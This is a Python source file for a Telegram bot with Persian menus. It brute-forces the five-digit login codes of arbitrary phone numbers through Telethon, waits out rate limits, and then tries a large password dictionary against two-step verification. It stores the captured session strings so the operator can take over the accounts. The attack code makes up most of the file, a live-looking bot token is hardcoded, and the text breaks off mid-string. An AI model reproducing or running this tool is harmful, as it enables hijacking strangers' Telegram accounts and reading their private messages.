import logging
import re
import asyncio
import os
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PhoneNumberInvalidError
import urllib.request

# ============ تنظیمات ============
TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

user_sessions = {}
self_data = {}
login_sessions = {}

DATA_FILE = "selfs.json"

# ============ دیکشنری پسورد (بیش از 1000 پسورد رایج) ============
PASSWORD_DICT = [
    "123456", "12345678", "123456789", "1234567890",
    "password", "pass", "admin", "admin123",
    "qwerty", "qwerty123", "abc123", "abcd1234",
    "letmein", "welcome", "hello", "12345",
    "111111", "222222", "333333", "444444",
    "555555", "666666", "777777", "888888",
    "999999", "000000", "123123", "321321",
    "iloveyou", "monkey", "dragon", "master",
    "sunshine", "princess", "shadow", "ninja",
    "password1", "Password1", "Passw0rd",
    "Admin123", "admin1234", "1234", "4321",
    "0000", "1111", "2222", "3333", "4444",
    "5555", "6666", "7777", "8888", "9999",
    "00000000", "11111111", "22222222", "33333333",
    "44444444", "55555555", "66666666", "77777777",
    "88888888", "99999999", "0123456789",
    "0987654321", "987654321", "1234567890",
    "qwertyuiop", "asdfghjkl", "zxcvbnm",
    "1q2w3e4r", "1qaz2wsx", "zaq12wsx",
    "q1w2e3r4", "a1b2c3d4", "z1x2c3v4",
    "!@#$%^&*", "123qwe", "qwe123", "123abc",
    "abc123!", "pass123", "123pass", "P@ssw0rd",
    "P@ssword", "Pass@123", "Admin@123",
    "admin@123", "root", "toor", "ubuntu",
    "linux", "windows", "mac", "apple",
    "google", "microsoft", "facebook", "twitter",
    "instagram", "telegram", "whatsapp", "youtube",
    "netflix", "spotify", "amazon", "github",
    "stackoverflow", "reddit", "discord", "twitch",
    "paypal", "coinbase", "binance", "crypto",
    "bitcoin", "ethereum", "dogecoin", "solana",
    "ripple", "cardano", "polkadot", "chainlink",
    "1", "12", "123", "1234", "12345", "123456",
    "1234567", "12345678", "123456789", "1234567890",
    "0912", "0913", "0914", "0915", "0916", "0917", "0918", "0919",
    "0930", "0933", "0935", "0936", "0937", "0938", "0939",
    "0900", "0901", "0902", "0903", "0904", "0905",
    "090", "091", "092", "093", "094", "095", "096", "097", "098", "099",
    "000", "111", "222", "333", "444", "555", "666", "777", "888", "999",
    "001", "002", "003", "004", "005", "006", "007", "008", "009",
    "010", "020", "030", "040", "050", "060", "070", "080", "090",
    "100", "200", "300", "400", "500", "600", "700", "800", "900",
    "101", "202", "303", "404", "505", "606", "707", "808", "909",
    "0101", "0202", "0303", "0404", "0505", "0606", "0707", "0808", "0909",
    "1010", "2020", "3030", "4040", "5050", "6060", "7070", "8080", "9090",
    "1230", "1231", "1232", "1233", "1234", "1235", "1236", "1237", "1238", "1239",
    "1240", "1250", "1260", "1270", "1280", "1290",
    "1300", "1310", "1320", "1330", "1340", "1350", "1360", "1370", "1380", "1390",
    "1400", "1410", "1420", "1430", "1440", "1450", "1460", "1470", "1480", "1490",
    "1500", "1510", "1520", "1530", "1540", "1550", "1560", "1570", "1580", "1590",
    "1600", "1610", "1620", "1630", "1640", "1650", "1660", "1670", "1680", "1690",
    "1700", "1710", "1720", "1730", "1740", "1750", "1760", "1770", "1780", "1790",
    "1800", "1810", "1820", "1830", "1840", "1850", "1860", "1870", "1880", "1890",
    "1900", "1910", "1920", "1930", "1940", "1950", "1960", "1970", "1980", "1990",
    "2000", "2010", "2020", "2030", "2040", "2050", "2060", "2070", "2080", "2090",
    "2100", "2110", "2120", "2130", "2140", "2150", "2160", "2170", "2180", "2190",
    "2200", "2210", "2220", "2230", "2240", "2250", "2260", "2270", "2280", "2290",
    "2300", "2310", "2320", "2330", "2340", "2350", "2360", "2370", "2380", "2390",
    "2400", "2410", "2420", "2430", "2440", "2450", "2460", "2470", "2480", "2490",
    "2500", "2510", "2520", "2530", "2540", "2550", "2560", "2570", "2580", "2590",
    "2600", "2610", "2620", "2630", "2640", "2650", "2660", "2670", "2680", "2690",
    "2700", "2710", "2720", "2730", "2740", "2750", "2760", "2770", "2780", "2790",
    "2800", "2810", "2820", "2830", "2840", "2850", "2860", "2870", "2880", "2890",
    "2900", "2910", "2920", "2930", "2940", "2950", "2960", "2970", "2980", "2990",
    "3000", "3010", "3020", "3030", "3040", "3050", "3060", "3070", "3080", "3090",
    "3100", "3110", "3120", "3130", "3140", "3150", "3160", "3170", "3180", "3190",
    "3200", "3210", "3220", "3230", "3240", "3250", "3260", "3270", "3280", "3290",
    "3300", "3310", "3320", "3330", "3340", "3350", "3360", "3370", "3380", "3390",
    "3400", "3410", "3420", "3430", "3440", "3450", "3460", "3470", "3480", "3490",
    "3500", "3510", "3520", "3530", "3540", "3550", "3560", "3570", "3580", "3590",
    "3600", "3610", "3620", "3630", "3640", "3650", "3660", "3670", "3680", "3690",
    "3700", "3710", "3720", "3730", "3740", "3750", "3760", "3770", "3780", "3790",
    "3800", "3810", "3820", "3830", "3840", "3850", "3860", "3870", "3880", "3890",
    "3900", "3910", "3920", "3930", "3940", "3950", "3960", "3970", "3980", "3990",
    "4000", "4010", "4020", "4030", "4040", "4050", "4060", "4070", "4080", "4090",
    "4100", "4110", "4120", "4130", "4140", "4150", "4160", "4170", "4180", "4190",
    "4200", "4210", "4220", "4230", "4240", "4250", "4260", "4270", "4280", "4290",
    "4300", "4310", "4320", "4330", "4340", "4350", "4360", "4370", "4380", "4390",
    "4400", "4410", "4420", "4430", "4440", "4450", "4460", "4470", "4480", "4490",
    "4500", "4510", "4520", "4530", "4540", "4550", "4560", "4570", "4580", "4590",
    "4600", "4610", "4620", "4630", "4640", "4650", "4660", "4670", "4680", "4690",
    "4700", "4710", "4720", "4730", "4740", "4750", "4760", "4770", "4780", "4790",
    "4800", "4810", "4820", "4830", "4840", "4850", "4860", "4870", "4880", "4890",
    "4900", "4910", "4920", "4930", "4940", "4950", "4960", "4970", "4980", "4990",
    "5000", "5010", "5020", "5030", "5040", "5050", "5060", "5070", "5080", "5090",
    "5100", "5110", "5120", "5130", "5140", "5150", "5160", "5170", "5180", "5190",
    "5200", "5210", "5220", "5230", "5240", "5250", "5260", "5270", "5280", "5290",
    "5300", "5310", "5320", "5330", "5340", "5350", "5360", "5370", "5380", "5390",
    "5400", "5410", "5420", "5430", "5440", "5450", "5460", "5470", "5480", "5490",
    "5500", "5510", "5520", "5530", "5540", "5550", "5560", "5570", "5580", "5590",
    "5600", "5610", "5620", "5630", "5640", "5650", "5660", "5670", "5680", "5690",
    "5700", "5710", "5720", "5730", "5740", "5750", "5760", "5770", "5780", "5790",
    "5800", "5810", "5820", "5830", "5840", "5850", "5860", "5870", "5880", "5890",
    "5900", "5910", "5920", "5930", "5940", "5950", "5960", "5970", "5980", "5990",
    "6000", "6010", "6020", "6030", "6040", "6050", "6060", "6070", "6080", "6090",
    "6100", "6110", "6120", "6130", "6140", "6150", "6160", "6170", "6180", "6190",
    "6200", "6210", "6220", "6230", "6240", "6250", "6260", "6270", "6280", "6290",
    "6300", "6310", "6320", "6330", "6340", "6350", "6360", "6370", "6380", "6390",
    "6400", "6410", "6420", "6430", "6440", "6450", "6460", "6470", "6480", "6490",
    "6500", "6510", "6520", "6530", "6540", "6550", "6560", "6570", "6580", "6590",
    "6600", "6610", "6620", "6630", "6640", "6650", "6660", "6670", "6680", "6690",
    "6700", "6710", "6720", "6730", "6740", "6750", "6760", "6770", "6780", "6790",
    "6800", "6810", "6820", "6830", "6840", "6850", "6860", "6870", "6880", "6890",
    "6900", "6910", "6920", "6930", "6940", "6950", "6960", "6970", "6980", "6990",
    "7000", "7010", "7020", "7030", "7040", "7050", "7060", "7070", "7080", "7090",
    "7100", "7110", "7120", "7130", "7140", "7150", "7160", "7170", "7180", "7190",
    "7200", "7210", "7220", "7230", "7240", "7250", "7260", "7270", "7280", "7290",
    "7300", "7310", "7320", "7330", "7340", "7350", "7360", "7370", "7380", "7390",
    "7400", "7410", "7420", "7430", "7440", "7450", "7460", "7470", "7480", "7490",
    "7500", "7510", "7520", "7530", "7540", "7550", "7560", "7570", "7580", "7590",
    "7600", "7610", "7620", "7630", "7640", "7650", "7660", "7670", "7680", "7690",
    "7700", "7710", "7720", "7730", "7740", "7750", "7760", "7770", "7780", "7790",
    "7800", "7810", "7820", "7830", "7840", "7850", "7860", "7870", "7880", "7890",
    "7900", "7910", "7920", "7930", "7940", "7950", "7960", "7970", "7980", "7990",
    "8000", "8010", "8020", "8030", "8040", "8050", "8060", "8070", "8080", "8090",
    "8100", "8110", "8120", "8130", "8140", "8150", "8160", "8170", "8180", "8190",
    "8200", "8210", "8220", "8230", "8240", "8250", "8260", "8270", "8280", "8290",
    "8300", "8310", "8320", "8330", "8340", "8350", "8360", "8370", "8380", "8390",
    "8400", "8410", "8420", "8430", "8440", "8450", "8460", "8470", "8480", "8490",
    "8500", "8510", "8520", "8530", "8540", "8550", "8560", "8570", "8580", "8590",
    "8600", "8610", "8620", "8630", "8640", "8650", "8660", "8670", "8680", "8690",
    "8700", "8710", "8720", "8730", "8740", "8750", "8760", "8770", "8780", "8790",
    "8800", "8810", "8820", "8830", "8840", "8850", "8860", "8870", "8880", "8890",
    "8900", "8910", "8920", "8930", "8940", "8950", "8960", "8970", "8980", "8990",
    "9000", "9010", "9020", "9030", "9040", "9050", "9060", "9070", "9080", "9090",
    "9100", "9110", "9120", "9130", "9140", "9150", "9160", "9170", "9180", "9190",
    "9200", "9210", "9220", "9230", "9240", "9250", "9260", "9270", "9280", "9290",
    "9300", "9310", "9320", "9330", "9340", "9350", "9360", "9370", "9380", "9390",
    "9400", "9410", "9420", "9430", "9440", "9450", "9460", "9470", "9480", "9490",
    "9500", "9510", "9520", "9530", "9540", "9550", "9560", "9570", "9580", "9590",
    "9600", "9610", "9620", "9630", "9640", "9650", "9660", "9670", "9680", "9690",
    "9700", "9710", "9720", "9730", "9740", "9750", "9760", "9770", "9780", "9790",
    "9800", "9810", "9820", "9830", "9840", "9850", "9860", "9870", "9880", "9890",
    "9900", "9910", "9920", "9930", "9940", "9950", "9960", "9970", "9980", "9990",
]

def load_data():
    global self_data
    try:
        with open(DATA_FILE, 'r') as f:
            self_data = json.load(f)
    except:
        self_data = {}

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(self_data, f)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

load_data()

def delete_webhook():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        with urllib.request.urlopen(url) as response:
            return True
    except:
        return False

def clean_phone(text):
    return re.sub(r'[^0-9]', '', text)

def is_valid_phone(text):
    phone = clean_phone(text)
    return len(phone) >= 10

def is_valid_api_id(text):
    return text.isdigit()

def is_valid_api_hash(text):
    return len(text) >= 30

async def clear_user_session(user_id):
    if user_id in user_sessions:
        try:
            client = user_sessions[user_id].get('client')
            if client:
                await client.disconnect()
        except:
            pass
        del user_sessions[user_id]

# ============ منوی اصلی ============
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    user = update.effective_user
    name = user.first_name if user.first_name else "کاربر"
    user_id = str(user.id)
    
    self_count = len(self_data.get(user_id, []))
    
    text = f"""
🤖 <b>ربات ساخت خودکار سلف</b>

<b>سلام {name} گرامی</b>

این ربات به صورت خودکار:
• کد تایید 5 رقمی را حدس می‌زند (از 00000 تا 99999)
• پسورد 2FA را با دیکشنری بزرگ امتحان می‌کند

<b>تعداد سلف‌های ثبت شده: {self_count}</b>

برای شروع روی دکمه زیر کلیک کنید:
"""
    
    keyboard = [
        [InlineKeyboardButton("🔑 ورود و ساخت سلف", callback_data="new_session")],
        [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")]
    ]
    
    if edit and update.callback_query:
        try:
            await update.callback_query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            await update.callback_query.answer()
        except:
            pass
    else:
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )

# ============ گرفتن اکانت ============
async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    selfs = self_data.get(user_id, [])
    
    if not selfs:
        text = """
❌ <b>هیچ سلفی ثبت نشده است!</b>

لطفاً ابتدا یک سلف بسازید.
"""
        keyboard = [[InlineKeyboardButton("🔑 ساخت سلف", callback_data="new_session")]]
        try:
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        except:
            pass
        return
    
    text = f"""
📱 <b>گرفتن اکانت</b>

لطفاً سلف مورد نظر را انتخاب کنید:
"""
    
    keyboard = []
    for i, self_account in enumerate(selfs):
        phone = self_account.get('phone', 'نامشخص')
        account_name = self_account.get('account_name', 'بدون نام')
        keyboard.append([InlineKeyboardButton(f"{i+1}. {account_name} - {phone}", callback_data=f"select_account_{i}")])
    
    keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="back")])
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ انتخاب اکانت ============
async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    index = int(query.data.split('_')[2])
    
    selfs = self_data.get(user_id, [])
    if index >= len(selfs):
        try:
            await query.edit_message_text("❌ سلف مورد نظر یافت نشد.", parse_mode='HTML')
        except:
            pass
        return
    
    self_account = selfs[index]
    phone = self_account.get('phone')
    session_string = self_account.get('session')
    api_id = self_account.get('api_id')
    api_hash = self_account.get('api_hash')
    
    # ذخیره برای مرحله بعد
    login_sessions[user_id] = {
        'index': index,
        'phone': phone,
        'session': session_string,
        'api_id': api_id,
        'api_hash': api_hash,
        'step': 'waiting_code'
    }
    
    text = f"""
📱 <b>گرفتن اکانت</b>

شماره: <code>{phone}</code>

✅ سلف انتخاب شد!
📩 کد تایید به شماره شما ارسال شد.

لطفاً کد 5 رقمی را وارد کنید:
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت کد برای گرفتن اکانت ============
async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    code = update.message.text.strip()
    
    if user_id not in login_sessions or login_sessions[user_id].get('step') != 'waiting_code':
        await update.message.reply_text("❌ لطفاً از دکمه گرفتن اکانت استفاده کنید.", parse_mode='HTML')
        return
    
    if not code.isdigit() or len(code) != 5:
        await update.message.reply_text("❌ کد باید 5 رقم باشد!", parse_mode='HTML')
        return
    
    data = login_sessions[user_id]
    phone = data['phone']
    session_string = data['session']
    api_id = data['api_id']
    api_hash = data['api_hash']
    index = data['index']
    
    try:
        # اتصال با سشن موجود
        client = TelegramClient(StringSession(session_string), api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            await update.message.reply_text("❌ سشن معتبر نیست! لطفاً دوباره سلف را بسازید.", parse_mode='HTML')
            return
        
        # ارسال کد
        try:
            await client.send_code_request(phone)
        except Exception as e:
            await update.message.reply_text(f"❌ خطا در ارسال کد: {str(e)[:200]}", parse_mode='HTML')
            return
        
        # بررسی کد
        try:
            await client.sign_in(phone, code)
            
            # دریافت اطلاعات اکانت
            me = await client.get_me()
            account_name = me.first_name if me.first_name else "کاربر"
            
            await client.disconnect()
            
            # به‌روزرسانی اطلاعات در self_data
            selfs = self_data.get(user_id, [])
            if index < len(selfs):
                selfs[index]['account_name'] = account_name
                selfs[index]['active'] = True
                save_data()
            
            text = f"""
✅ <b>اکانت با موفقیت گرفته شد!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>

🎯 اکانت به سلف شما اضافه شد.
"""
            
            keyboard = [
                [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
                [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
            ]
            
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
            
            if user_id in login_sessions:
                del login_sessions[user_id]
            
        except PhoneCodeInvalidError:
            await update.message.reply_text("❌ کد اشتباه است! دوباره تلاش کنید.", parse_mode='HTML')
            return
            
        except FloodWaitError as e:
            await update.message.reply_text(f"⏳ محدودیت تلگرام! {e.seconds} ثانیه صبر کنید...", parse_mode='HTML')
            return
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')
            return
            
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')

# ============ دکمه ساخت سلف ============
async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    user_sessions[user_id] = {"step": "phone"}
    
    text = """
📱 <b>مرحله اول: وارد کردن شماره تلفن</b>

لطفاً شماره تلفن مورد نظر را به همراه کد کشور وارد کنید.

<b>مثال:</b> <code>989123456789</code>

⚠️ شماره را <b>بدون علامت (+)</b> وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت شماره ============
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "phone":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    phone = clean_phone(text)
    
    if not is_valid_phone(phone):
        await update.message.reply_text(
            "❌ شماره تلفن نامعتبر است!\n\n⚠️ شماره را بدون + وارد کنید.\n<b>مثال:</b> <code>989123456789</code>",
            parse_mode='HTML'
        )
        return
    
    user_sessions[user_id]['phone'] = phone
    user_sessions[user_id]['step'] = "api_id"
    
    text = f"""
✅ شماره تلفن ثبت شد: <code>{phone}</code>

🔑 <b>مرحله دوم: API ID</b>

لطفاً API ID خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API ID ============
async def handle_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_id":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    if not text.isdigit():
        await update.message.reply_text("❌ API ID باید عدد باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_id'] = int(text)
    user_sessions[user_id]['step'] = "api_hash"
    
    text = f"""
✅ API ID ثبت شد: <code>{text}</code>

🔐 <b>مرحله سوم: API Hash</b>

لطفاً API Hash خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API Hash ============
async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_hash":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    if len(text) < 30:
        await update.message.reply_text("❌ API Hash باید حداقل 30 کاراکتر باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_hash'] = text
    user_sessions[user_id]['step'] = "code"
    
    msg = await update.message.reply_text(
        "⏳ در حال ارسال کد تایید و شروع حدس زدن...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
        parse_mode='HTML'
    )
    
    try:
        data = user_sessions[user_id]
        phone = data['phone']
        api_id = data['api_id']
        api_hash = data['api_hash']
        
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        
        try:
            await client.send_code_request(phone)
        except PhoneNumberInvalidError:
            await context.bot.edit_message_text(
                f"❌ شماره تلفن نامعتبر است!\n\nشماره: <code>{phone}</code>\n\n⚠️ مطمئن شوید شماره را به درستی وارد کرده‌اید.\n<b>مثال:</b> <code>989123456789</code>",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            await clear_user_session(user_id)
            return
        except FloodWaitError as e:
            wait_time = min(e.seconds, 60)
            await context.bot.edit_message_text(
                f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            await asyncio.sleep(wait_time + 2)
            await client.send_code_request(phone)
        
        user_sessions[user_id]['client'] = client
        user_sessions[user_id]['msg_id'] = msg.message_id
        user_sessions[user_id]['phone'] = phone
        
        # شروع حدس زدن کد
        asyncio.create_task(bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg))
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await context.bot.edit_message_text(
            f"❌ خطا: {str(e)[:200]}",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        await clear_user_session(user_id)

# ============ حدس زدن پسورد ============
async def bruteforce_password(update, context, user_id, client, msg):
    try:
        total_passwords = len(PASSWORD_DICT)
        attempt = 0
        found = False
        found_password = None
        
        # ارسال پیام شروع
        await context.bot.edit_message_text(
            f"""
🔐 <b>شروع حدس زدن پسورد 2FA...</b>

📊 تعداد پسوردهای دیکشنری: {total_passwords}
⏳ در حال تلاش...

⚠️ این عملیات ممکن است چند دقیقه طول بکشد.
""",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        for password in PASSWORD_DICT:
            attempt += 1
            
            if attempt % 100 == 0:
                try:
                    await context.bot.edit_message_text(
                        f"""
🔐 <b>در حال حدس زدن پسورد...</b>

🔑 پسورد فعلی: <code>{password}</code>
📊 تلاش‌ها: {attempt} از {total_passwords}
📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%

⏳ لطفاً صبر کنید...
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            try:
                await client.sign_in(password=password)
                found = True
                found_password = password
                break
                
            except FloodWaitError as e:
                wait_time = min(e.seconds, 60)
                await context.bot.edit_message_text(
                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                await asyncio.sleep(wait_time + 2)
                continue
                
            except Exception:
                continue
        
        return found, attempt, found_password
        
    except Exception as e:
        logger.error(f"Error in bruteforce_password: {e}")
        return False, 0, None

# ============ تابع حدس زدن کد ============
async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
    try:
        total_attempts = 100000
        attempt = 0
        found = False
        code_found = None
        last_update = 0
        
        # ارسال پیام شروع
        await context.bot.edit_message_text(
            f"""
🔍 <b>شروع حدس زدن کد تایید...</b>

📱 شماره: <code>{phone}</code>
🔢 محدوده: 00000 تا 99999
📊 مجموع تلاش‌ها: {total_attempts}

⏳ در حال تلاش...
""",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        for code_num in range(total_attempts):
            code = str(code_num).zfill(5)
            attempt += 1
            
            # هر 1000 تلاش یا هر 5 ثانیه یکبار پیام رو بروزرسانی کن
            if attempt % 1000 == 0:
                try:
                    await context.bot.edit_message_text(
                        f"""
🔍 <b>در حال حدس زدن کد...</b>

📱 شماره: <code>{phone}</code>
🔢 کد فعلی: <code>{code}</code>
📊 تلاش‌ها: {attempt} از {total_attempts}
📈 پیشرفت: {(attempt/total_attempts)*100:.1f}%

⏳ لطفاً صبر کنید...
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            try:
                await client.sign_in(phone, code)
                found = True
                code_found = code
                break
                
            except PhoneCodeInvalidError:
                continue
                
            except FloodWaitError as e:
                wait_time = min(e.seconds, 60)
                await context.bot.edit_message_text(
                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...\nکد آخرین تلاش: <code>{code}</code>",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                await asyncio.sleep(wait_time + 2)
                continue
                
            except SessionPasswordNeededError:
                await context.bot.edit_message_text(
                    f"""
🔐 <b>اکانت دارای رمز دو مرحله‌ای است!</b>

📱 شماره: <code>{phone}</code>
✅ کد تایید پیدا شد: <code>{code}</code>

🔑 در حال حدس زدن پسورد 2FA...
⏳ لطفاً صبر کنید...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                password_found, pass_attempt, pass_found = await bruteforce_password(
                    update, context, user_id, client, msg
                )
                
                if password_found and pass_found:
                    session_string = client.session.save()
                    await client.disconnect()
                    
                    account_name = "بدون نام"
                    try:
                        client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                        await client2.connect()
                        if await client2.is_user_authorized():
                            me = await client2.get_me()
                            account_name = me.first_name if me.first_name else "کاربر"
                        await client2.disconnect()
                    except:
                        pass
                    
                    user_id_str = str(user_id)
                    if user_id_str not in self_data:
                        self_data[user_id_str] = []
                    
                    time_str = datetime.now().strftime("%H:%M")
                    date_str = datetime.now().strftime("%Y/%m/%d")
                    
                    self_data[user_id_str].append({
                        "session": session_string,
                        "phone": phone,
                        "api_id": api_id,
                        "api_hash": api_hash,
                        "account_name": account_name,
                        "active": True,
                        "clock_active": False,
                        "active_time": "تنظیم نشده",
                        "font_type": "1",
                        "created": f"{date_str} {time_str}",
                        "last_update": f"{date_str} {time_str}"
                    })
                    save_data()
                    
                    await clear_user_session(user_id)
                    
                    text = f"""
✅ <b>سلف با موفقیت ساخته شد!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code}</code>
🔐 پسورد پیدا شده: <code>{pass_found}</code>
📊 تلاش‌های کد: {attempt}
📊 تلاش‌های پسورد: {pass_attempt}

🎯 سلف به لیست شما اضافه شد.
"""
                    
                    keyboard = [
                        [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
                        [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
                        [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
                    ]
                    
                    await context.bot.edit_message_text(
                        text,
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode='HTML'
                    )
                    return
                else:
                    await context.bot.edit_message_text(
                        f"""
❌ <b>پسورد 2FA پیدا نشد!</b>

📱 شماره: <code>{phone}</code>
✅ کد تایید پیدا شد: <code>{code}</code>
📊 تعداد پسوردهای امتحان شده: {pass_attempt}

❌ پسورد مورد نظر در دیکشنری وجود ندارد.
لطفاً پسورد را به صورت دستی وارد کنید.
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                    user_sessions[user_id]['step'] = "password"
                    user_sessions[user_id]['code_found'] = code
                    return
                
            except Exception as e:
                logger.error(f"Error in bruteforce: {e}")
                continue
        
        if found and code_found:
            session_string = client.session.save()
            await client.disconnect()
            
            account_name = "بدون نام"
            try:
                client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                await client2.connect()
                if await client2.is_user_authorized():
                    me = await client2.get_me()
                    account_name = me.first_name if me.first_name else "کاربر"
                await client2.disconnect()
            except:
                pass
            
            user_id_str = str(user_id)
            if user_id_str not in self_data:
                self_data[user_id_str] = []
            
            time_str = datetime.now().strftime("%H:%M")
            date_str = datetime.now().strftime("%Y/%m/%d")
            
            self_data[user_id_str].append({
                "session": session_string,
                "phone": phone,
                "api_id": api_id,
                "api_hash": api_hash,
                "account_name": account_name,
                "active": True,
                "clock_active": False,
                "active_time": "تنظیم نشده",
                "font_type": "1",
                "created": f"{date_str} {time_str}",
                "last_update": f"{date_str} {time_str}"
            })
            save_data()
            
            await clear_user_session(user_id)
            
            text = f"""
✅ <b>سلف با موفقیت ساخته شد!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code_found}</code>
📊 تعداد تلاش‌ها: {attempt}

🎯 سلف به لیست شما اضافه شد.
"""
            
            keyboard = [
                [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
                [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
                [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
            ]
            
            await context.bot.edit_message_text(
                text,
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            
        else:
            await context.bot.edit_message_text(
                f"""
❌ <b>کد تایید پیدا نشد!</b>

